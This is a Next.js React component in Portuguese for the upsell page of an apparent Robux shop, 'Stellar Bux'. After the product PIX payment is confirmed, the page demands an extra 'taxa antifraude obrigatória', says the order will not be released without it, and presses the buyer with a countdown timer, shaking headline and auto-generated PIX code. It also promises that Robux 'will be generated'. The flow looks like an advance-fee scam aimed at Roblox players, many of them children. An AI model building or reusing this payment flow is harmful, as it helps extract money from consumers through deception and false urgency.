"use client";

import Link from "next/link";
import { useRouter } from "next/navigation";
import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { ANTIFRAUD_FEE_REAIS, UPSELL_WINDOW_MS } from "@/lib/catalog";
import { fetchOrder, loadOrder, saveOrder } from "@/lib/order-client";
import { orderCompletionCopy, type StoreOrder } from "@/lib/orders";

const reais = new Intl.NumberFormat("pt-BR", { style: "currency", currency: "BRL" });
const feeLabel = reais.format(ANTIFRAUD_FEE_REAIS);

export function UpsellView({ id }: { id: string }) {
  const router = useRouter();
  const [ready, setReady] = useState(false);
  const [order, setOrder] = useState<StoreOrder | null>(null);
  const [loadingPix, setLoadingPix] = useState(false);
  const [error, setError] = useState("");
  const [copied, setCopied] = useState(false);
  const [now, setNow] = useState(Date.now());
  const started = useRef(false);

  const sync = useCallback(async () => {
    if (!id) return null;
    const remote = await fetchOrder(id);
    if (remote) {
      saveOrder(remote);
      setOrder(remote);
    }
    return remote;
  }, [id]);

  const startTaxPix = useCallback(async () => {
    if (!id) return;
    setLoadingPix(true);
    setError("");
    try {
      const response = await fetch("/api/upsell/pix", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id, order: loadOrder(id) ?? order }),
      });
      const body = (await response.json()) as { order?: StoreOrder; error?: string };
      if (!response.ok || !body.order) throw new Error(body.error || "Não foi possível gerar o PIX da taxa.");
      saveOrder(body.order);
      setOrder(body.order);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Não foi possível gerar o PIX.");
    } finally {
      setLoadingPix(false);
    }
  }, [id]);

  useEffect(() => {
    setReady(true);
    if (!id) return;
    setOrder(loadOrder(id));
    void sync();
  }, [id, sync]);

  useEffect(() => {
    if (!ready || !order) return;
    if (order.phase === "principal") {
      router.replace(`/pedido?id=${encodeURIComponent(order.id)}`);
      return;
    }
    if (order.phase === "concluido") return;

    if (order.phase === "taxa" && order.principalPaid && !order.taxPaid && !order.pix && !loadingPix && !started.current) {
      started.current = true;
      void startTaxPix();
    }
  }, [ready, order, router, loadingPix, startTaxPix]);

  useEffect(() => {
    if (!order || order.phase === "concluido") return;
    const timer = window.setInterval(() => {
      setNow(Date.now());
      void sync();
    }, 4000);
    return () => window.clearInterval(timer);
  }, [order, sync]);

  const remainingMs = useMemo(() => {
    if (!order?.upsellExpiresAt) return UPSELL_WINDOW_MS;
    return Math.max(0, Date.parse(order.upsellExpiresAt) - now);
  }, [order?.upsellExpiresAt, now]);

  const expired = remainingMs <= 0 && order?.phase === "taxa" && !order.taxPaid;
  const timerLabel = `${String(Math.floor(remainingMs / 60000)).padStart(2, "0")}:${String(Math.ceil((remainingMs % 60000) / 1000)).padStart(2, "0")}`;
  const showPix = Boolean(order?.pix && order.phase === "taxa" && order.status === "pendente");

  async function copyCode() {
    if (!order?.pix?.copyPaste) return;
    try {
      await navigator.clipboard.writeText(order.pix.copyPaste);
      setCopied(true);
    } catch {
      setCopied(false);
    }
  }

  if (!id) {
    return <p className="px-5 py-20 text-center text-muted-foreground">Pedido não encontrado.</p>;
  }

  if (!ready || !order) {
    return <p className="px-5 py-20 text-center text-muted-foreground">Carregando...</p>;
  }

  if (order.phase === "concluido") {
    const copy = orderCompletionCopy(order);
    return (
      <main className="mx-auto w-full max-w-xl px-5 py-12">
        <div className="glass rounded-[22px] p-6 text-center sm:p-8">
          <p className="text-sm font-bold tracking-[0.18em] text-[#c084fc] uppercase">Taxa confirmada</p>
          <h1 className="neon-title neon-title-lg mt-2 text-2xl sm:text-3xl">{copy.title}</h1>
          <p className="mt-4 text-base leading-relaxed text-muted-foreground">
            {copy.hasRobux ? (
              <>
                Seus Robux serão gerados e entregues na conta Roblox <strong className="text-foreground">{copy.username}</strong>, exatamente como você informou no checkout. {copy.timing}
              </>
            ) : (
              <>
                Sua compra será entregue na conta Roblox <strong className="text-foreground">{copy.username}</strong>. {copy.timing}
              </>
            )}
          </p>
          <p className="mt-3 text-xs text-muted-foreground">{copy.flevoNote}</p>
          <code className="mt-4 inline-block rounded-lg bg-white/8 px-2 py-1 font-mono text-sm">{order.id}</code>
          <Link className="btn-brand mt-6 inline-flex h-11 items-center justify-center rounded-xl px-5" href="/">Voltar à loja</Link>
        </div>
      </main>
    );
  }

  return (
    <main className="mx-auto w-full max-w-2xl px-5 py-10">
      <div className="upsell-scan relative overflow-hidden rounded-[26px] border border-[#c084fc]/45 bg-gradient-to-br from-[#1a0a2e]/95 via-[#12081f]/90 to-black/80 p-6 shadow-[0_0_60px_-12px_rgba(192,132,252,0.45)] sm:p-8">
        <p className="text-center text-xs font-semibold tracking-[0.18em] text-[#c084fc] uppercase">Etapa obrigatória</p>
        <h1 className="neon-title neon-title-lg upsell-shake mt-3 text-center text-[clamp(1.6rem,4vw,2.4rem)] leading-tight">
          Libere seus Robux agora — taxa antifraude obrigatória
        </h1>
        <p className="mx-auto mt-3 max-w-xl text-center text-sm leading-relaxed text-muted-foreground">
          Seu PIX dos produtos foi confirmado. Para concluir a entrega na conta <strong className="text-foreground">{order.customer.roblox_username}</strong>, pague <strong className="text-[#e9d5ff]">{feeLabel}</strong> nesta etapa separada. Sem este pagamento, o pedido <strong className="text-[#ffb4b4]">não é liberado</strong>.
        </p>
        <div className="upsell-flash mx-auto mt-6 flex max-w-md items-center justify-center gap-3 rounded-2xl border border-[#c084fc]/50 bg-[#c084fc]/10 px-4 py-3">
          <div className="text-left">
            <p className="text-xs font-semibold tracking-wide text-[#e9d5ff] uppercase">Tempo restante</p>
            <p className="font-mono text-2xl font-extrabold tabular-nums">{timerLabel}</p>
          </div>
        </div>
        <ul className="mt-6 grid gap-2 text-sm sm:grid-cols-3">
          {["Validação antifraude em tempo real", "Prioridade na fila de entrega", "Proteção do seu usuário Roblox"].map((item) => (
            <li key={item} className="flex items-start gap-2 rounded-xl border border-white/10 bg-white/5 px-3 py-2">
              <span>{item}</span>
            </li>
          ))}
        </ul>
        {!showPix ? (
          <button className="btn-brand upsell-pulse mt-8 w-full text-base" type="button" disabled={loadingPix || expired} onClick={() => void startTaxPix()}>
            {loadingPix ? "Gerando PIX..." : `Pagar ${feeLabel} e liberar meus Robux`}
          </button>
        ) : null}
        {error ? <p className="mt-3 text-center text-sm text-[#ff8d8d]">{error}</p> : null}
        {showPix && order.pix ? (
          <div className="mt-6 rounded-2xl border border-white/15 bg-black/30 p-4">
            <p className="text-sm font-semibold">PIX Stellar Bux · taxa {feeLabel}</p>
            {order.pix.qrCodeImage ? (
              <div className="mx-auto mt-3 w-fit rounded-2xl bg-white p-3">
                <img alt="QR Code PIX taxa" src={order.pix.qrCodeImage} width={220} height={220} />
              </div>
            ) : null}
            {order.pix.copyPaste ? (
              <>
                <textarea className="mt-3 h-24 w-full rounded-xl border border-white/15 bg-transparent p-3 text-xs" readOnly value={order.pix.copyPaste} aria-label="Código Pix copia e cola da taxa" />
                <button className="btn-glass mt-2 w-full" type="button" onClick={() => void copyCode()}>
                  {copied ? "Código Pix copiado!" : "Copiar código Pix"}
                </button>
              </>
            ) : null}
            <p className="mt-4 text-center font-semibold">Aguardando confirmação da taxa...</p>
          </div>
        ) : null}
      </div>
    </main>
  );
}